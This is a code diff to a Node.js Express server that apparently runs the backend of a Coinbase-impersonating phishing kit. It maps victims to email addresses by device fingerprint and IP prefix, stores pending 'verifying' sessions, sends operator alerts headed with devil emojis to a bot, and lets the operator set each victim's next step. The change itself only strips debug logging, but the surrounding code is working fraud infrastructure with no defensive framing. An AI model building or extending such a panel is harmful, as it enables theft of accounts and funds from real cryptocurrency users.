@@ -1854,33 +1854,20 @@ app.post("/send-verifying", async (req, res) => {
     const fingerprint = getDeviceFingerprint(req);
     const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
-    console.log(`🔍 DEBUG /send-verifying: Original email: ${email}`);
-    console.log(`🔍 DEBUG: Fingerprint: ${fingerprint}`);
-    console.log(`🔍 DEBUG: IP Prefix: ${ipPrefix}`);
-    console.log(`🔍 DEBUG: deviceFingerprintToEmail[${fingerprint}] = ${deviceFingerprintToEmail[fingerprint]}`);
-    console.log(`🔍 DEBUG: ipPrefixToEmail[${ipPrefix}] = ${ipPrefixToEmail[ipPrefix]}`);
-
     // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
     let displayEmail = email; // Default to original
     
     // Try fingerprint first (most reliable)
     if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
       displayEmail = deviceFingerprintToEmail[fingerprint];
-      console.log(`✅ Found latest email via fingerprint: ${displayEmail}`);
     }
     // Try IP prefix as fallback
     else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
       displayEmail = ipPrefixToEmail[ipPrefix];
-      console.log(`✅ Found latest email via IP prefix: ${displayEmail}`);
-    } else {
-      console.log(`⚠️ No latest email found, using original: ${displayEmail}`);
     }
-
-    console.log(`📧 Final displayEmail: ${displayEmail}`);
 
     // ✅ Store displayEmail as primary email so bot.js gets the correct one
     pendingVerifying[verifyingId] = { status: "pending", userId, email: displayEmail || email, displayEmail, choice: null };
-    console.log(`💾 Stored pendingVerifying[${verifyingId}]:`, pendingVerifying[verifyingId]);
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
@@ -1975,9 +1962,6 @@ app.post("/update-verifying-choice", (req, res) => {
     if (pendingVerifying[verifyingId]) {
       pendingVerifying[verifyingId].choice = choice;
       pendingVerifying[verifyingId].updatedAt = Date.now();
-      console.log(`✅ Updated verifying choice for ${verifyingId}:`, pendingVerifying[verifyingId]);
-    } else {
-      console.log(`⚠️ verifyingId ${verifyingId} not found in pendingVerifying`);
     }
 
     res.json({ ok: true });
@@ -1995,20 +1979,12 @@ app.post("/update-verifying-choice", (req, res) => {
 app.get("/get-verifying-info/:verifyingId", (req, res) => {
   try {
     const { verifyingId } = req.params;
-    
-    console.log(`🔍 DEBUG /get-verifying-info: verifyingId=${verifyingId}`);
-    console.log(`🔍 DEBUG: ALL pendingVerifying keys:`, Object.keys(pendingVerifying));
-    console.log(`🔍 DEBUG: pendingVerifying[${verifyingId}] =`, pendingVerifying[verifyingId]);
-    console.log(`🔍 DEBUG: Full object:`, JSON.stringify(pendingVerifying[verifyingId], null, 2));
-    
     const entry = pendingVerifying[verifyingId];
 
     if (entry) {
-      console.log(`✅ Found entry, returning:`, entry);
       return res.json(entry);
     }
 
-    console.log(`❌ Entry not found, returning null`);
     res.json(null);
 
   } catch (err) {
